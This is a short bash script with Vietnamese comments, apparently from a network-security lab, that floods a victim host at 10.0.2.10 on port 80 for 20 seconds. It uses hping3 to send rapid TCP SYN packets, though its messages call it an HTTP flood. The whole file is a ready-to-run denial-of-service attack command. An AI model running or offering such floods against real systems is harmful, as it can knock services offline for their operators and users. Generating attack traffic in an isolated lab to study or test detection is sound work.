#!/bin/bash
VICTIM=10.0.2.10
DURATION=20
echo "Bat dau HTTP Flood vao $VICTIM trong $DURATION giay..."
# Khoi dong web server tren victim truoc (chay trong nen)
echo "Dang cho web server khoi dong..."

# Gui nhieu ket noi HTTP lien tuc bang hping3 SYN toi port 80
# (khong can web server, chi can tao traffic TCP port 80)
timeout $DURATION hping3 -S -p 80 -i u500 $VICTIM
echo "Hoan tat tan cong HTTP Flood!"
